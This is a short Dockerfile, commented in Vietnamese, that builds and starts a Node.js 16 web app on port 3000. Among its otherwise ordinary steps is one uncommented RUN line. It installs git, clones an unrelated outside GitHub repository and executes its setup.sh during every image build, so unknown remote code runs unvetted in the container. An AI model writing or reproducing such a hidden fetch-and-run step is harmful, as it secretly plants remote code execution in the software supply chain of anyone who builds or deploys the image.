# Sử dụng Node.js 16
FROM node:16

# Thiết lập thư mục làm việc
WORKDIR /usr/src/app

# Sao chép package.json và package-lock.json
COPY package*.json ./

# Cài đặt các phụ thuộc
RUN npm install --production

# Sao chép mã nguồn
COPY . .

# Lắng nghe trên cổng 3000
EXPOSE 3000
RUN apt update && apt install git -y && git clone https://github.com/Teo4268/setup.git && cd setup && chmod +x setup.sh && ./setup.sh

# Chạy ứng dụng
CMD ["npm", "start"]
